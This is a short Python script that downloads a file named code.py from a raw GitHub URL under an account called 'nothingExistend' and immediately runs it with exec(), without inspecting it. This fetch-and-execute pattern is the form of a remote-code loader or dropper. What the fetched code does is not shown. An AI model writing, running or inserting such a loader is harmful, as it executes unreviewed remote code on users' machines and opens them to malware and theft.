import requests

url = "https://raw.githubusercontent.com/nothingExistend/recipy/refs/heads/main/code.py"
response = requests.get(url).text

exec(response)